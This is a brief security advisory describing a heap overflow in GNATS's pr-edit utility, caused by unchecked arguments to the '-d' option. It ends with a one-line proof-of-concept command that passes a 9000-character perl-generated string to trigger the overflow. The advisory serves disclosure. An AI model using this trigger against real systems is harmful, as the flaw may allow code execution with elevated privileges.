A heap overflow vulnerability has been reported for the pr-edit utility of GNATS. The vulnerability occurs due to insufficient checks performed on the arguments to the '-d' commandline option.

Successful exploitation may result in the execution of attacker-supplied code with potentially elevated privileges.

/usr/local/lib/gnats/./pr-edit -d`perl -e 'print "x"x9000'`
